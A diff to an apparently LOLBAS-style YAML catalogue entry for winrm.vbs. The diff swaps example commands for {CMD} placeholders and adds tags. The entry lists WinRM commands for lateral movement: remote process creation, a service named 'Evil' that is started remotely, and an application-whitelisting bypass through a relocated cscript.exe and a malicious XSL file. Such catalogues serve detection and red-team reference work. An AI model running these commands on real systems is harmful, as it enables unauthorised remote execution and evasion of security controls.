@@ -1,23 +1,29 @@
 ---
 Name: winrm.vbs
 Description: Script used for manage Windows RM settings
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: 'winrm invoke Create wmicimv2/Win32_Process @{CommandLine="notepad.exe"} -r:http://target:5985'
+  - Command: 'winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985'
     Description: Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol
     Usecase: Proxy execution
     Category: Execute
     Privileges: User
     MitreID: T1216
     OperatingSystem: Windows 10, Windows 11
-  - Command: 'winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="cmd.exe /k c:\windows\system32\notepad.exe"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985'
+    Tags:
+      - Execute: CMD
+      - Execute: Remote
+  - Command: 'winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985'
     Description: Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol
     Usecase: Proxy execution
     Category: Execute
     Privileges: Admin
     MitreID: T1216
     OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: CMD
+      - Execute: Remote
   - Command: '%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty'
     Description: Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.
     Usecase: Execute arbitrary, unsigned code via XSL script
@@ -25,6 +31,8 @@ Commands:
     Privileges: User
     MitreID: T1220
     OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: XSL
 Full_Path:
   - Path: C:\Windows\System32\winrm.vbs
   - Path: C:\Windows\SysWOW64\winrm.vbs
